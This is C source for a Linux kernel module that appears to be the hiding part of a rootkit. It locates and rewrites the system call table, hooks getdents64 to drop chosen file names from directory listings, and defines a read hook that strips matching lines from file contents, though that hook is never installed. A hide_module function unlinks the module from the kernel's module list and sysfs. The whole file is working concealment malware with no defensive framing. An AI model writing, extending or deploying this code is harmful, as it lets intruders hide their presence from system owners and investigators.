#include "hide.h"

#include <asm/cacheflush.h>
#include <asm/ptrace.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/uaccess.h>
#include <linux/version.h>

/* ── kallsyms_lookup_name via kprobe (kernel >= 5.7) ── */

static struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);

static unsigned long *syscall_table = NULL;

/* With CONFIG_ARCH_HAS_SYSCALL_WRAPPER (all x86_64 kernels >= 4.17), syscall
 * table entries take a single "const struct pt_regs *" argument.  Declaring
 * hooks with the matching signature avoids pointer truncation and lets us read
 * the real syscall arguments directly from the pt_regs struct. */
static long (*orig_getdents64)(const struct pt_regs *) = NULL;
static long (*orig_read)(const struct pt_regs *)       = NULL;

/* ── hidden lists ── */

struct hidden_file
{
    char             name[256];
    struct list_head list;
};

struct hidden_line
{
    char             filename[256];
    char             pattern[256];
    struct list_head list;
};

static LIST_HEAD(hidden_files);
static LIST_HEAD(hidden_lines);

/* ── write-protect helpers ── */

static void set_addr_rw(unsigned long addr)
{
    unsigned int level;
    pte_t       *pte = lookup_address(addr, &level);

    if (pte)
        pte->pte |= _PAGE_RW;
}

static void set_addr_ro(unsigned long addr)
{
    unsigned int level;
    pte_t       *pte = lookup_address(addr, &level);

    if (pte)
        pte->pte &= ~_PAGE_RW;
}

/* ── hooked getdents64 ── */

static long hooked_getdents64(const struct pt_regs *regs)
{
    struct linux_dirent64 __user *dirent;
    long                          ret;
    long                          new_ret;
    struct hidden_file           *hf;
    char                         *buf;
    int                           bpos = 0;

    ret = orig_getdents64(regs);
    if (ret <= 0 || ret > 65536 || list_empty(&hidden_files))
        return ret;

    /* regs->si = second syscall argument = user dirent pointer */
    dirent  = (struct linux_dirent64 __user *)regs->si;
    new_ret = ret;

    buf = kmalloc(ret, GFP_ATOMIC);
    if (!buf)
        return ret;

    if (copy_from_user(buf, dirent, ret))
    {
        kfree(buf);
        return ret;
    }

    while (bpos < ret)
    {
        struct linux_dirent64 *d      = (struct linux_dirent64 *)(buf + bpos);
        int                    reclen = d->d_reclen;

        if (reclen == 0 || bpos + reclen > ret)
            break;

        list_for_each_entry(hf, &hidden_files, list)
        {
            if (strcmp(d->d_name, hf->name) == 0)
            {
                memmove(buf + bpos, buf + bpos + reclen,
                        ret - bpos - reclen);
                new_ret -= reclen;
                ret     -= reclen;
                goto next;
            }
        }
        bpos += reclen;
    next:;
    }

    (void)copy_to_user(dirent, buf, new_ret);
    kfree(buf);
    return new_ret;
}

/* ── hooked read (line filtering) ── */

static long hooked_read(const struct pt_regs *regs)
{
    char __user        *buf;
    long                ret;
    long                new_ret;
    struct hidden_line *hl;
    char               *kbuf;

    ret = orig_read(regs);
    if (ret <= 0 || ret > 65536 || list_empty(&hidden_lines))
        return ret;

    /* regs->si = second syscall argument = user buffer pointer */
    buf     = (char __user *)regs->si;
    new_ret = ret;

    kbuf = kmalloc(ret + 1, GFP_ATOMIC);
    if (!kbuf)
        return ret;

    if (copy_from_user(kbuf, buf, ret))
    {
        kfree(kbuf);
        return ret;
    }
    kbuf[ret] = '\0';

    list_for_each_entry(hl, &hidden_lines, list)
    {
        char *pos = kbuf;

        while ((pos = strstr(pos, hl->pattern)) != NULL)
        {
            char *line_start = pos;
            char *line_end;
            int   line_len;

            while (line_start > kbuf && *(line_start - 1) != '\n')
                line_start--;
            line_end = strchr(pos, '\n');
            line_end = line_end ? line_end + 1 : kbuf + new_ret;
            line_len = line_end - line_start;
            memmove(line_start, line_end, new_ret - (line_end - kbuf));
            new_ret       -= line_len;
            kbuf[new_ret]  = '\0';
        }
    }

    (void)copy_to_user(buf, kbuf, new_ret);
    kfree(kbuf);
    return new_ret;
}

/* ── public API ── */

void hide_module(void)
{
    list_del_init(&THIS_MODULE->list);
#if LINUX_VERSION_CODE < KERNEL_VERSION(6, 4, 0)
    kobject_del(&THIS_MODULE->mkobj.kobj);
#endif
}

void hide_file(const char *name)
{
    struct hidden_file *hf = kmalloc(sizeof(*hf), GFP_KERNEL);

    if (!hf)
        return;
    strncpy(hf->name, name, sizeof(hf->name) - 1);
    hf->name[sizeof(hf->name) - 1] = '\0';
    list_add(&hf->list, &hidden_files);
}

void unhide_file(const char *name)
{
    struct hidden_file *hf, *tmp;

    list_for_each_entry_safe(hf, tmp, &hidden_files, list)
    {
        if (strcmp(hf->name, name) == 0)
        {
            list_del(&hf->list);
            kfree(hf);
        }
    }
}

void hide_line(const char *filename, const char *pattern)
{
    struct hidden_line *hl = kmalloc(sizeof(*hl), GFP_KERNEL);

    if (!hl)
        return;
    strncpy(hl->filename, filename, sizeof(hl->filename) - 1);
    hl->filename[sizeof(hl->filename) - 1] = '\0';
    strncpy(hl->pattern, pattern, sizeof(hl->pattern) - 1);
    hl->pattern[sizeof(hl->pattern) - 1] = '\0';
    list_add(&hl->list, &hidden_lines);
}

void unhide_line(const char *filename, const char *pattern)
{
    struct hidden_line *hl, *tmp;

    list_for_each_entry_safe(hl, tmp, &hidden_lines, list)
    {
        if (strcmp(hl->filename, filename) == 0
            && strcmp(hl->pattern, pattern) == 0)
        {
            list_del(&hl->list);
            kfree(hl);
        }
    }
}

/* ── init / exit ── */

int hide_init(void)
{
    kallsyms_lookup_name_t kallsyms_fn;

    register_kprobe(&kp);
    kallsyms_fn = (kallsyms_lookup_name_t)kp.addr;
    unregister_kprobe(&kp);

    if (!kallsyms_fn)
        return -1;

    syscall_table = (unsigned long *)kallsyms_fn("sys_call_table");
    if (!syscall_table)
        return -1;

    orig_getdents64 = (typeof(orig_getdents64))syscall_table[__NR_getdents64];
    orig_read       = (typeof(orig_read))syscall_table[__NR_read];

    set_addr_rw((unsigned long)syscall_table);
    syscall_table[__NR_getdents64] = (unsigned long)hooked_getdents64;
    set_addr_ro((unsigned long)syscall_table);

    return 0;
}

void hide_exit(void)
{
    struct hidden_file *hf, *hf_tmp;
    struct hidden_line *hl, *hl_tmp;

    if (!syscall_table)
        return;

    set_addr_rw((unsigned long)syscall_table);
    syscall_table[__NR_getdents64] = (unsigned long)orig_getdents64;
    set_addr_ro((unsigned long)syscall_table);

    list_for_each_entry_safe(hf, hf_tmp, &hidden_files, list)
    {
        list_del(&hf->list);
        kfree(hf);
    }
    list_for_each_entry_safe(hl, hl_tmp, &hidden_lines, list)
    {
        list_del(&hl->list);
        kfree(hl);
    }

}
